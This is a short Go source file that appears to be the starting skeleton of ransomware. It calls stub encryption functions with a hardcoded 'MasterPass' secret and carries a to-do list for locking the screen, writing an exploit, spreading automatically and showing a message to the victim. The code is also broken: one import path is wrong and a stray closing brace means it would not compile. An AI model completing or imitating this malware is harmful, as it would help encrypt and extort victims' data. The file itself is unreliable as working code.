package main

import (
	// native packs 
	"fmt"
	"io/util"
	"net/http"
	"strings"
	"time"
	"os"

	// own packs 
	"src/encrypt"
	"src/sploit"
)

func main() {

	const secret = "MasterPass" // Define Encryption Path 

	// Encrypt
	encrypt.NewBlob()
	encrypt.ToByteArray()
	encrypt.Encrypt()


	/*
	TO-DO:
	- lock screen
	- write sploit
	- write automatic distribution of unic0rn
	- write message to monitor
	-
	*/
	}
}